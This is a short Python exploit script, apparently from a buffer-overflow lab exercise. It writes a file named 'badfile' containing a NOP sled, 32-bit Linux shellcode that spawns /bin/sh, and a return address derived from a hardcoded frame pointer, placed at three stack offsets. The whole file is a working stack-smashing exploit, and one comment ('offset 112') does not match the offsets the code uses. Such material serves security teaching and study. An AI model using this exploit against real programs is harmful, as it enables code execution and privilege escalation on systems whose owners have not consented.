# 1 : 134
# 2 : 123
# 3 : 66
# ebp : 0xffffd288
import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
filesize = 516
content = bytearray(0x90 for i in range(filesize)) 
# Put the shellcode at the end 
start = filesize - len(shellcode) 
content[start:start+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffd288 + 200 
offset = 134+4
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 


offset = 123+4
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 


offset = 66+4
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 

 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

